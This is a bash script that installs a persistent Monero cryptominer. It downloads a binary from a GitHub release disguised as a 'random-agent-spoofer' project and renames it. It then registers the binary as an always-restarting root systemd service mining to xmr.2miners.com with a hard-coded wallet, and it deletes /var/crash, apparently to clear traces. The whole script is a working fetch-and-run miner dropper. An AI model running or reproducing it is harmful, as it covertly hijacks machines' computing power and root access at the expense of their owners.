#!/bin/bash
cd /home
sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
sudo cp ar jvdar 
sudo chmod +x jvdar

sudo rm -rf /lib/systemd/system/xmrthanh.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar --coin=XMR -o xmr.2miners.com:2222 -u 86MbukuwW42DjbkU3vVckHP6LYRTWxrRF1G2J8ZwmEzARs14ME7uNdt1Sp4TmpARszgzqG2p4jwNT43NvfYAgrai9hGwgNE.kiemcom -p x
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
